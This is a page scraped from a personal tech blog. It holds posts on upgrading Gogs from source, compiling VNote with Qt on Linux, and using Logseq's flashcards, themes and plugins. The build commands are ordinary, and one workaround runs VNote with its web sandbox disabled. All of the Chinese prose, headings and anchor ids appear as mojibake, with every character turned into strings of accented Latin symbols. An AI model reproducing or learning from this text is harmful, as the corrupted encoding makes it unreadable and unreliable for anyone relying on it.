http://website:8000/*</span></span><br><span class="line"><span class="comment">// @grant        GM_getResourceText</span></span><br><span class="line"><span class="comment">// @grant        GM_addStyle</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> my_css = <span class="title function_">GM_getResourceText</span>(<span class="string">&quot;IMPORTED_CSS&quot;</span>);</span><br><span class="line">    <span class="title function_">GM_addStyle</span>(my_css);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨åæ•ˆæœå›¾</p>
<p><img src="https://github.com/henices/pictures/raw/master/gogs0.png"></p>
<h2 id="æºç å‡çº§"><a href="#æºç å‡çº§" class="headerlink" title="æºç å‡çº§"></a>æºç å‡çº§</h2><p>gogs å·²ç»æœ‰ä¸€å¹´å¤šæ²¡æœ‰æä¾›äºŒè¿›åˆ¶çš„å®‰è£…åŒ…äº†ï¼Œçœ‹äº†æ”¹è¿›ä¸å°‘ï¼Œå°±å°è¯•äº†æºç å‡çº§ã€‚<br>å‚è€ƒ <a target="_blank" rel="noopener" href="https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85">https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85</a></p>
<h3 id="å®‰è£…-golang"><a href="#å®‰è£…-golang" class="headerlink" title="å®‰è£… golang"></a>å®‰è£… golang</h3><p>å‚è€ƒ Google å®˜æ–¹æ–‡æ¡£ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤å°±å¯ä»¥äº†ã€‚ <a target="_blank" rel="noopener" href="https://go.dev/doc/install">https://go.dev/doc/install</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/go/bin</span><br></pre></td></tr></table></figure>
<h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…‹éš†ä»“åº“åˆ° &quot;gogs&quot; å­ç›®å½•</span></span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/gogs/gogs.git gogs</span><br><span class="line"><span class="comment"># ä¿®æ”¹å·¥ä½œç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> gogs</span><br><span class="line"><span class="comment"># ç¼–è¯‘ä¸»ç¨‹åºï¼Œè¿™ä¸ªæ­¥éª¤ä¼šä¸‹è½½æ‰€æœ‰ä¾èµ–</span></span><br><span class="line">go build -o gogs</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘è¿‡ç¨‹ä¼šä¸‹è½½æ–‡ä»¶ï¼ˆéœ€è¦è‡ªå¤‡æ¢¯å­ï¼‰ï¼Œç¼–è¯‘å®Œæˆåå°†åœ¨ gogs å·¥ä½œç›®ä¸‹ç”Ÿæˆ gogs å¯æ‰§è¡Œæ–‡ä»¶</p>
<h3 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h3><p>gogs æºç çš„ Makefile æä¾›äº†æ‰“åŒ…å‘½ä»¤ï¼Œæ‰§è¡Œ <code>make pack</code> å³å¯ï¼Œå°†åœ¨ release ç›®ç”Ÿæˆ <code>gogs.20220112095054.zip</code></p>
<h3 id="è¿ç§»é…ç½®"><a href="#è¿ç§»é…ç½®" class="headerlink" title="è¿ç§»é…ç½®"></a>è¿ç§»é…ç½®</h3><p>å°† gogs.20220112095054.zip è§£å‹ï¼Œè¿™å°±ç±»ä¼¼ gogs çš„äºŒè¿›åˆ¶å‡çº§äº† <a target="_blank" rel="noopener" href="https://gogs.io/docs/upgrade/upgrade_from_binary">https://gogs.io/docs/upgrade/upgrade_from_binary</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> gogs gogs_old</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/custom gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/data gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/log gogs</span><br></pre></td></tr></table></figure>

<p>gogs 0.13 çš„é…ç½®å·²ç»å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚æœä¸ä¿®æ”¹é…ç½®æ‰§è¡Œ <code>./gogs web</code>ä¼šå‡ºç°é”™è¯¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2022/01/12 09:40:06 [ INFO] Gogs 0.13.0+dev</span><br><span class="line">2022/01/12 09:40:06 [FATAL] [...github/internal/route/install.go:75 GlobalInit()] Failed to initialize ORM engine:</span><br><span class="line">open database: failed to connect to `host=127.0.0.1 user=root database=gogs`: dial error (dial tcp 127.0.0.1:3306: connect: connection refused)</span><br></pre></td></tr></table></figure>

<p>çœ‹é”™è¯¯åƒæ˜¯åœ¨è¿æ¥ mysql çš„ 3306 ç«¯å£ï¼Œå¯æ˜¯é…ç½®æ–‡ä»¶è®¾ç½®çš„æ˜¯ä½¿ç”¨ sqliteï¼Œéå¸¸å›°æƒ‘ã€‚ä¸Šç½‘æœç´¢åè¯å®æ˜¯ gogs 0.13 çš„é…ç½®æ–‡ä»¶çš„å­—æ®µä¿®æ”¹äº†ã€‚</p>
<p><img src="https://github.com/henices/pictures/raw/master/gogs1.png"></p>
<p>æœ€å…³é”®çš„ä¸¤ä¸ªå­—æ®µæ˜¯æ•°æ®åº“ç›¸å…³çš„ <code>DB_TYPE</code> æ”¹ä¸º <code>TYPE</code>ï¼Œ <code>PASSWD</code> æ”¹ä¸º <code>PASSWORD</code> ä¿®æ”¹å <code>custom/conf/app.ini</code> åï¼Œæ‰§è¡Œ <code>./gogs web</code> ä¸€åˆ‡æ­£å¸¸ã€‚</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/04/01/vnote/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/01/vnote/" class="post-title-link" itemprop="url">Markdown ç¬”è®°è½¯ä»¶ï¼š VNote</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-01 18:25:24" itemprop="dateCreated datePublished" datetime="2022-04-01T18:25:24+08:00">2022-04-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>å‘å¤§å®¶å®‰åˆ©ä¸€æ¬¾ markdown ç¬”è®°è½¯ä»¶ï¼Œ VNote <a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a><br>æ­¤è½¯ä»¶ç›®å‰å·²ç» 1300 å¤šä¸ªcommits äº†ï¼Œåšä¸ºä¸€ä¸ªæœ‰äº›å¼€æºè½¯ä»¶ç»´æŠ¤ç»å†çš„äººï¼Œæ·±æ„Ÿä¸æ˜“ã€‚<br>ç”¨äº†å¤ªå¤š markdown ç¬”è®°è½¯ä»¶ï¼Œæ­¤è½¯ä»¶ä½¿å¾—æœ€ä¸ºé¡ºæ‰‹ï¼Œå°¤å…¶ä½œä¸ºç¨‹åºå‘˜ vim æ¨¡å¼ è®©æˆ‘æ„Ÿåˆ°éå¸¸èˆ’æœï¼Œ<br>å¤§é‡å›¾è¡¨çš„æ”¯æŒæ¯”å¦‚ UML æµç¨‹å›¾ï¼Œè®©æˆ‘ç”¨èµ·æ¥å¾ˆé¡ºæ‰‹ã€‚</p>
<p>Vnote åˆ†ä¸ºä¸¤ä¸ªå¼€å‘é˜¶æ®µï¼Œé˜¶æ®µä¸€ vnote2 å·²ç»å¼€å‘å®Œæˆï¼š<a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote/tree/vnote2">https://github.com/vnotex/vnote/tree/vnote2</a><br>ç°åœ¨å¤„äºç¬¬äºŒä¸ªå¼€å‘é˜¶æ®µï¼š<a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p>
<p>æ®è¯´åç»­ä¼šå‡ºæ”¶è´¹ç‰ˆæœ¬ï¼Œä½†ç›®å‰çœ‹è¿˜éœ€è¦å¾ˆé•¿çš„ä¸€æ®µæ—¶é—´äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/henices/pictures/master/vnote.png" alt="VNote"></p>
<p>æˆ‘å‰åå°è¯•è¿‡å„ç§ç¬”è®°è½¯ä»¶ï¼Œæˆ‘ç†æƒ³çš„è½¯ä»¶æœ‰å‡ ç‚¹ï¼š</p>
<ul>
<li>a. æ”¯æŒæ–‡ä»¶ç®¡ç†</li>
<li>b. ä¸è¦ä¹±æ”¹æ•°æ®ï¼Œå®¹æ˜“è¿ç§»</li>
<li>c. æ”¯æŒ markdown</li>
<li>d. è·¨å¹³å°ï¼Œæ”¯æŒ Mac å’Œ Linux</li>
</ul>
<p>æœ€åï¼Œç»ˆäºå‘ç°äº† VNoteï¼Œæœ‰ç‚¹æƒŠå–œã€‚åœ¨ Linux ä¸‹ç¼–è¯‘ VNote æ˜¾ç¤ºæœ‰æ˜æ˜¾æ”¹è¿›ï¼Œä¸‹é¢æ˜¯ç¼–è¯‘çš„æ–¹æ³•ï¼š</p>
<ol>
<li>ä¸‹è½½ QT SDK  ï¼ˆæœ€æ–°çš„ vnotex å®˜æ–¹æ”¯æŒ Qt 5.12ï¼Œå¯è‡ªè¡Œä¸‹è½½ä½¿ç”¨æ›¿æ¢ç›¸åº”çš„ç‰ˆæœ¬å³å¯ï¼‰</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run">https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run</a></p>
<p>å°† Qt5.9 å®‰è£…åˆ° &#x2F;home&#x2F;henices&#x2F;Qt5.9.0&#x2F;</p>
<ol start="2">
<li>ç¼–è¯‘ fcitx-qt5 ï¼ˆå¦‚æœä½¿ç”¨çš„æ˜¯ fcitx5ï¼Œéœ€è¦ä¸‹è½½ç¼–è¯‘ fcitx5-qtï¼‰</li>
</ol>
<p>git clone <a target="_blank" rel="noopener" href="https://gitlab.com/fcitx/fcitx-qt5.git">https://gitlab.com/fcitx/fcitx-qt5.git</a></p>
<p>å‡†å¤‡ç¼–è¯‘è„šæœ¬ <code>build_linux.sh</code>ï¼Œ æŒ‡å®šä¸‹è½½çš„QT</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf build</span><br><span class="line"><span class="built_in">mkdir</span> -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤ç¼–è¯‘</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure>

<p>å°†ç”Ÿæˆçš„ libfcitxplatforminputcontextplugin.so copy åˆ°<br><code>/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/</code></p>
<ol start="3">
<li>è·å–VNote æºç </li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tamlok/vnote.git vnote.git</span><br><span class="line"><span class="built_in">cd</span> vnote.git</span><br><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>ç¼–è¯‘</li>
</ol>
<p>build_linux.sh</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf build</span><br><span class="line"><span class="built_in">mkdir</span> -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">qmake -v</span><br><span class="line">qmake PREFIX=/usr/local CONFIG-=debug CONFIG+=release ../VNote.pro</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤ç¼–è¯‘</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>å®‰è£…</li>
</ol>
<p><code>sudo make install</code></p>
<h2 id="è¯¡å¼‚é—®é¢˜"><a href="#è¯¡å¼‚é—®é¢˜" class="headerlink" title="è¯¡å¼‚é—®é¢˜"></a>è¯¡å¼‚é—®é¢˜</h2><p>Fedora å‡çº§åˆ° 35 åï¼ŒVnote å‡ºç°äº†ä¸€ç³»åˆ—é—®é¢˜</p>
<ol>
<li><p>vnote çš„é˜…è¯»æ¨¡å¼ä¸èƒ½æ­£å¸¸æ˜¾ç¤º ï¼ˆQt 5.12.11ï¼‰</p>
<p>è§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦ç¦ç”¨ Qtwebengine çš„ sandbox</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vnote --no-sandbox</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>å¯¼å‡º pdf æ–‡ä»¶ cpu 100%  ï¼ˆFedora ç³»ç»Ÿè‡ªå¸¦ Qt 5.15.2 ç¼–è¯‘ï¼‰</li>
<li>å®˜æ–¹æä¾›çš„ Linux AppImage æ–‡ä»¶æ— æ³•æ‰“å¼€ Fcitx5 è¾“å…¥æ³•ã€‚</li>
</ol>
<p>æœ€ç»ˆè§£å†³é—®é¢˜çš„æ–¹æ³•æ˜¯ä¸‹è½½ Qt5.15.2 é‡æ–°ç¼–è¯‘ Vnoteï¼Œ Qt ä» 5.15 å¼€å§‹ä¸æä¾›ç¦»çº¿å®‰è£…åŒ…ï¼Œéå¸¸ä¸æ–¹ä¾¿ã€‚<br>å®˜æ–¹æä¾›çš„åœ¨çº¿å‡çº§åŒ…å¦‚æœå¤ªæ–°åªèƒ½å®‰è£… Qt 6ï¼Œæ‰€ä»¥å¿…é¡»ä¸‹è½½è€ç‰ˆæœ¬çš„ online installer<br><a target="_blank" rel="noopener" href="https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run">https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run</a></p>
<p>å…·ä½“å†…å®¹å¯ä»¥å‚è€ƒ <a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote/issues/1942">https://github.com/vnotex/vnote/issues/1942</a> çš„è®¨è®º</p>
<h3 id="Qt-5-15-3"><a href="#Qt-5-15-3" class="headerlink" title="Qt 5.15.3"></a>Qt 5.15.3</h3><p>ä½¿ç”¨ Qt 5.15.3 ç¼–è¯‘ VNOte åï¼Œå‡ºç°ä¸‹é¢çš„æŠ¥é”™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[695784:695784:0401/181224.580254:ERROR:network_service_instance_impl.cc(286)] Network service crashed, restarting service.</span><br></pre></td></tr></table></figure>

<p>bug åœ¨è¿™ <a target="_blank" rel="noopener" href="https://bugreports.qt.io/browse/QTBUG-91715">https://bugreports.qt.io/browse/QTBUG-91715</a> å¯ä»¥å…ˆä½¿ç”¨ç¯å¢ƒå˜é‡æ•‘æ€¥ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QTWEBENGINE_DISABLE_SANDBOX=1 QTWEBENGINE_CHROMIUM_FLAGS=--lang=de ./vnote --no-sandbox --disable-gpu</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md">https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/03/07/logseq2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/07/logseq2/" class="post-title-link" itemprop="url">Logseq ä½¿ç”¨å°ç»“ ï¼ˆäºŒï¼‰</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-07 12:20:11" itemprop="dateCreated datePublished" datetime="2022-03-07T12:20:11+08:00">2022-03-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>ç”¨äº† Logseq ä¸€æ®µæ—¶é—´äº†ï¼Œåšä¸ªç®€å•çš„æ€»ç»“ï¼Œå›½å†…çš„å¾ˆå¤šæ–‡ç« ï¼Œåœ¨æˆ‘çœ‹æ¥è¿˜æ˜¯ä¸å¤Ÿç®€å•æ˜äº†, æœ¬æ–‡å¤§è‡´ä»‹ç»äº† Logseq æ¯”è¾ƒå¸¸ç”¨çš„ä¸€äº›åŠŸèƒ½çš„ä½¿ç”¨ã€‚</p>
<h2 id="Flashcards"><a href="#Flashcards" class="headerlink" title="Flashcards"></a>Flashcards</h2><p>å¯ä»¥æŠŠè®°å½•çš„çŸ¥è¯†ç‚¹å½“ä½œå¡ç‰‡æ¥è®°å¿†ï¼Œç”¨è¿‡ Anki çš„åŒå­¦ï¼Œåº”è¯¥éƒ½æ¯”è¾ƒç†Ÿæ‚‰äº†ï¼Œä½¿ç”¨çš„è®°å¿†ç®—æ³•ä¸º <a target="_blank" rel="noopener" href="https://www.supermemo.com/en/archives1990-2015/english/ol/sm5">SM-5</a><br>è¦å°†ä¸€ä¸ª block è®°ä¸ºå¡ç‰‡éå¸¸ç®€å•ï¼Œä½¿ç”¨ <code>#card</code> æ ‡ç­¾å°±å¯ä»¥äº†ã€‚</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq5.png"></p>
<h3 id="å¡ç‰‡ç»„"><a href="#å¡ç‰‡ç»„" class="headerlink" title="å¡ç‰‡ç»„"></a>å¡ç‰‡ç»„</h3><p>æœ‰äº›å¡ç‰‡å¯èƒ½æ˜¯å½’å±åŒä¸€ä¸ªå¤§ç±»ï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨å¡ç‰‡ç»„äº†ã€‚åƒæˆ‘ä¸Šé¢è¿™ä¸ªä¾‹å­ä¸­ï¼Œè¦è®°å¿†çš„å•è¯éƒ½åœ¨ <code>è‹±è¯­å•è¯ç§¯ç´¯</code>ä¸‹ï¼Œå°±å¯ä»¥ä½¿ç”¨è¯­æ³• <code>&#123;&#123;cards è‹±è¯­å•è¯ç§¯ç´¯&#125;&#125;</code> æ•ˆæœå¦‚ä¸‹å›¾ï¼Œ<br>å¯ä»¥çœ‹å‡ºæˆ‘å·²ç»ç§¯ç´¯äº†7å¼ å¡ç‰‡äº†ã€‚</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq6.png"></p>
<p>è¦èƒŒè¯µéœ€è¦è®°å¿†çš„å¡ç‰‡æ—¶ï¼Œå•å‡»å·¦ä¾§çš„ Flashcards å°±å¯ä»¥äº†ï¼Œä½¿ç”¨æ–¹é¢æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œæœ‰ä¸‰ä¸ªé€‰é¡¹å¯ä»¥é€‰æ‹©ã€‚</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq7.png"></p>
<h2 id="theme-ï¼ˆçš®è‚¤ï¼‰"><a href="#theme-ï¼ˆçš®è‚¤ï¼‰" class="headerlink" title="theme ï¼ˆçš®è‚¤ï¼‰"></a>theme ï¼ˆçš®è‚¤ï¼‰</h2><p>çš®è‚¤å°±æ˜¯é’èœèåœå„æœ‰æ‰€çˆ±äº†ï¼Œæ¨èä¸¤æ¬¾æˆ‘è‡ªå·±æ¯”è¾ƒå–œæ¬¢çš„çš„çš®è‚¤ã€‚</p>
<p><img src="https://github.com/pengx17/logseq-laurel-theme/raw/master/white.png"><br><img src="https://raw.githubusercontent.com/tobealive/logseq-allday-theme/main/preview.png"></p>
<p>Github ä»“åº“åœ°å€å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pengx17/logseq-laurel-theme">https://github.com/pengx17/logseq-laurel-theme</a><br><a target="_blank" rel="noopener" href="https://github.com/tobealive/logseq-allday-theme">https://github.com/tobealive/logseq-allday-theme</a></p>
<p>æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥è®¾ç½®çš®è‚¤ï¼š</p>
<ul>
<li>custom.css</li>
<li>plugin system</li>
</ul>
<p>ä½¿ç”¨ custom.cssï¼Œæ‰“å¼€ Settings -&gt;     General -&gt;  Custom theme  ç‚¹å‡» <code>custom.css</code> å¤åˆ¶ css å†…å®¹ï¼Œä¿å­˜é€€å‡ºå³å¯ã€‚<br>ä½¿ç”¨æ’ä»¶ç³»ç»Ÿï¼Œåˆ™éœ€è¦å…ˆæŠŠæ’ä»¶ç³»ç»Ÿæ‰“å¼€ï¼ŒSettings  -&gt;  Advanced -&gt; Plug-in system ã€‚æ‰“å¼€æ’ä»¶ç³»ç»Ÿåï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<br>Plugins -&gt; Marketplace -&gt; themes é€‰æ‹©ä½ å–œæ¬¢çš„ theme ç‚¹å‡» <code>Install</code> å°±å¯ä»¥äº†</p>
<p>ä¸è¿‡è¿˜æ˜¯æ¨èä½¿ç”¨ Logseq è‡ªå¸¦çš„æ’ä»¶ç®¡ç†ç³»ç»Ÿæ¥å®‰è£…ï¼Œå¯ä»¥è‡ªåŠ¨å‡çº§æ¯”è¾ƒæ–¹ä¾¿ï¼Œåˆ‡æ¢çš®è‚¤å¯ä»¥ç‚¹å‡»å³ä¸Šè§’ ä¸‰ä¸ªç‚¹ -&gt; Themes é€‰æ‹©çš®è‚¤ã€‚ </p>
<h2 id="plugin-ï¼ˆæ’ä»¶ï¼‰"><a href="#plugin-ï¼ˆæ’ä»¶ï¼‰" class="headerlink" title="plugin ï¼ˆæ’ä»¶ï¼‰"></a>plugin ï¼ˆæ’ä»¶ï¼‰</h2><p>ä½¿ç”¨ Logseq æ’ä»¶åŒæ ·æ˜¯ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li>plugin system</li>
<li>Load unpacked plugin</li>
</ul>
<p>ä½¿ç”¨æ’ä»¶ç³»ç»Ÿçš„æ–¹æ³•å’Œä¸Šé¢å®‰è£…çš®è‚¤çš„æ­¥éª¤å¤§è‡´ç›¸åŒï¼Œä¾æ¬¡ç‚¹å‡» Plugins -&gt; Marketplace -&gt; Plugins ï¼Œé€‰æ‹©æ’ä»¶ç‚¹å‡» <code>Install</code> å³å¯ã€‚è¦åŠ è½½ <code>unpacked plugin</code> é¦–å…ˆè¦æ‰“å¼€å¼€å‘è€…æ¨¡å¼ Settings  -&gt;  Advanced -&gt; Developer mode ,  è®¾ç½®ä¸ºæ‰“å¼€ã€‚æ‰“å¼€åä½¿ç”¨æ’ä»¶ç®¡ç†ç³»ç»Ÿ Plugins -&gt; Installed -&gt; Load unpacked plugin é€‰æ‹©ç›¸å…³ç›®å½•å°±å¯ä»¥äº†ã€‚</p>
<p>å…·ä½“çš„æ’ä»¶å¯ä»¥å‚è€ƒ <a target="_blank" rel="noopener" href="https://github.com/logseq/awesome-logseq#Plugins">https://github.com/logseq/awesome-logseq#Plugins</a> è®°å½•çš„æ’ä»¶éƒ½æŒºä¸é”™çš„ã€‚</p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ’ä»¶ç³»ç»Ÿçš„ç½‘ç»œä¸å¤ªç¨³å®šï¼ˆæ€»æ‰€å‘¨çŸ¥çš„åŸå› ï¼‰ï¼Œä½¿ç”¨ä»£ç†ä¼šæ–¹ä¾¿ä¸€äº›ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https_proxy=127.0.0.1:3128 ./Logseq --proxy-server=http://127.0.0.1:3128</span><br></pre></td></tr></table></figure>

<p>å®‰è£…æ’ä»¶å¯èƒ½ä¼šå‡ºç° timeout é”™è¯¯ï¼Œå¤šé‡è¯•å‡ æ¬¡å°±åº”è¯¥å¯ä»¥å®‰è£…ä¸Šäº†ã€‚</p>
<h2 id="query"><a href="#query" class="headerlink" title="query"></a>query</h2><p>query ç®—æ˜¯ Logseq çš„é«˜çº§åŠŸèƒ½äº†ï¼Œæˆ‘ç”¨çš„ä¹Ÿä¸å¤šï¼Œè¾“å…¥ <code>/query</code> å›è½¦å°±å¯ä»¥è‡ªåŠ¨è¿›å…¥ query äº†ï¼Œå…·ä½“çš„è¯­æ³•å¾ˆçµæ´»å¯ä»¥å‚è€ƒï¼š<br><a target="_blank" rel="noopener" href="https://logseq.github.io/#/page/queries">https://logseq.github.io/#/page/queries</a></p>
